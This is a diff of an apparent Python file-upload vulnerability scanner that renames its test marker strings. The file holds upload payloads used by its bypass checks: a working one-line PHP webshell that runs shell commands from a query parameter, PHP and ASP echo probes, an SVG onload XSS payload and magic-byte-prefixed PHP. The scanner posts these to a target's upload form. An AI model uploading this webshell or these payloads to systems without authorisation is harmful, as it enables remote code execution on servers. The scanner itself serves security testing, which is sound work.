@@ -1,5 +1,5 @@
 """
-cyberm4fia-scanner - File Upload Vulnerability Scanner
+scanner - File Upload Vulnerability Scanner
 Detects insecure file upload handling: extension bypass, content-type bypass,
 magic byte injection, blacklist/whitelist bypass, SVG XSS, directory traversal.
 Based on Az0x7/vulnerability-Checklist and OWASP file upload guidelines.
@@ -52,14 +52,14 @@ MAGIC_BYTES = {
 
 # Webshell payloads (minimal, for detection only)
 WEBSHELL_PAYLOADS = [
-    '<?php echo "cybm4fia_upload_test"; ?>',
+    '<?php echo "scanner_upload_test"; ?>',
     '<?=`$_GET[x]`?>',
-    '<% Response.Write("cybm4fia_upload_test") %>',
+    '<% Response.Write("scanner_upload_test") %>',
 ]
 
 # SVG XSS payload
 SVG_XSS_PAYLOAD = '''<?xml version="1.0" encoding="UTF-8"?>
-<svg xmlns="http://www.w3.org/2000/svg" onload="alert('cybm4fia')">
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert('scanner')">
   <text x="0" y="20">Upload Test</text>
 </svg>'''
 
@@ -121,7 +121,7 @@ def _test_extension_bypass(upload_url, file_input_name, delay=0):
     all_extensions = PHP_EXTENSIONS + ASP_EXTENSIONS + JSP_EXTENSIONS
 
     for ext in all_extensions[:15]:
-        filename = f"cybm4fia_test{ext}"
+        filename = f"scanner_test{ext}"
         payload = WEBSHELL_PAYLOADS[0]
 
         try:
@@ -159,7 +159,7 @@ def _test_content_type_bypass(upload_url, file_input_name, delay=0):
     findings = []
 
     for mime_type, ext in CONTENT_TYPE_BYPASS:
-        filename = f"cybm4fia_test{ext}"
+        filename = f"scanner_test{ext}"
         payload = WEBSHELL_PAYLOADS[0]
 
         try:
@@ -195,8 +195,8 @@ def _test_magic_byte_bypass(upload_url, file_input_name, delay=0):
     findings = []
 
     for file_type, magic in MAGIC_BYTES.items():
-        payload = magic + b'\n<?php echo "cybm4fia_magic_test"; ?>'
-        filename = "cybm4fia_test.php"
+        payload = magic + b'\n<?php echo "scanner_magic_test"; ?>'
+        filename = "scanner_test.php"
         mime = f"image/{file_type}"
 
         try:
@@ -294,7 +294,7 @@ def _test_traversal_filename(upload_url, file_input_name, delay=0):
 
     for filename in TRAVERSAL_FILENAMES:
         try:
-            files = {file_input_name: (filename, b"cybm4fia_traversal_test", "image/png")}
+            files = {file_input_name: (filename, b"scanner_traversal_test", "image/png")}
             resp = smart_request(
                 "post", upload_url, files=files, delay=delay, timeout=10,
             )
